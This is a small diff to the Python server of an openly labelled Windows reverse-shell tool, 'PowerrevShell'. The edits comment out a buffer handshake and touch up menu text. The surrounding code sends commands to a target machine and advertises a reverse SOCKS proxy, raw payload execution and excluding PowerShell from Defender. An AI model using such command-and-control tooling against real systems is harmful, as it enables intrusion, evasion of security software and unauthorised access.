@@ -363,6 +363,11 @@ def func(conn,file,file_size): #function for the get functionality
 def send_data(conn,cmd,strip=True,file=''): #command to send command to the target machine
     data = ""
     while (True):
+        #size = f"[BUFFER] {len(cmd)}"
+        #conn.sendall(size.encode()) #send buffer size
+        #if (conn.recv(1024).decode() != '[OKSIZE]'): #wait for callback
+        #    continue
+        #else:
         conn.sendall(cmd.encode()) #send actual command
         if (conn.recv(1024).decode() != '[OKCMD]'): #wait for callback
             continue
@@ -427,7 +432,7 @@ def server(HOST:str,PORT:int,WEBPORT:int,CHECK_HTTP:bool,CHECK_SMB:bool,SHARE:st
             print("")
             print("------------------------------------------------------------------")
             print("      PowerrevShell - Windows reverse shell | Fedami")
-            print("        https://github.com/Fedami/powerrevshell---rev.ps1")
+            print("     https://github.com/Fedami/powerrevshell---rev.ps1")
             print("")                                                                                                                                                              
             whoami = send_data(conn,"whoami")
             groups = send_data(conn,"whoami /groups")
@@ -474,7 +479,7 @@ def server(HOST:str,PORT:int,WEBPORT:int,CHECK_HTTP:bool,CHECK_SMB:bool,SHARE:st
                         print(Fore.CYAN + "[*] " + Fore.RESET + f" smb-get       <FILE>                -> Transfer file to the smb server folder (start smb server with 'impacket-smbserver -port <PORT> -smb2support kali <FOLDERNAME>')")
                     print(Fore.CYAN + "[*] " + Fore.RESET + f" socks-start   <L-PORT> <P-PORT>     -> Start reverse socks proxy on local port <L-PORT> and proxy port <P-PORT> [Default L-PORT:8080, P-PORT:1080].")
                     print(Fore.CYAN + "[*] " + Fore.RESET + f" socks-stop                          -> Stop current socks proxy.")
-                    print(Fore.CYAN + "[*] " + Fore.RESET + f" socks                               -> Show current's active socks proxy.")
+                    print(Fore.CYAN + "[*] " + Fore.RESET + f" socks                               -> Show current active socks proxy info.")
                     print(Fore.CYAN + "[*] " + Fore.RESET + " payload       <FILE>                -> Try to execute bytes paylaod (<FILE> must contains only the bytes separated by ',')")
                     print(Fore.CYAN + "[*] " + Fore.RESET + " menu                                -> Show this page.")
                     print(Fore.CYAN + "[*] " + Fore.RESET + " exclude                             -> Try to exluce powershell process from defender.")
